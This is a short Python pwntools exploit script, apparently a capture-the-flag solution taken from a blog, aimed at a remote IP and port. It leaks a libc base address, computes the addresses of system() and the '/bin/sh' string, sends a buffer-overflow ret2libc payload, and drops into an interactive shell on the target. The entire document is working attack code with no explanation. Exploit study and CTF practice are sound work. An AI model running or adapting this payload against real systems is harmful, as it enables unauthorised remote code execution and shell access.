#http://nextline.tistory.com/112
from pwn import *

s = remote('139.59.61.220', 42345)

def pmsg(msg):
    s.recvuntil(':')
    s.sendline(msg)
    sleep(0.01)

pmsg('3')
libc_base = u32("\x60\x6d" + s.recvline()[:2]) - 0x1b2d60
system_add = p32(libc_base  + 0x3ada0)
binsh = p32(libc_base + 0x15b82b)

print '[+] LIBC_BASE_ADD : ' + hex(libc_base)
print '[+] SYSTEM_ADD : ' + hex(u32(system_add))
print '[+] BINSH_ADD : ' + hex(u32(binsh))

pmsg('1')
s.sendline('A' * 48)

pmsg('2')
s.sendline('1')

payload = 'A' * 26 + system_add + 'AAAA' + binsh
print '[+] Payload Len : ' + str(len(payload))
s.sendline(payload)

pmsg('4')

s.interactive()
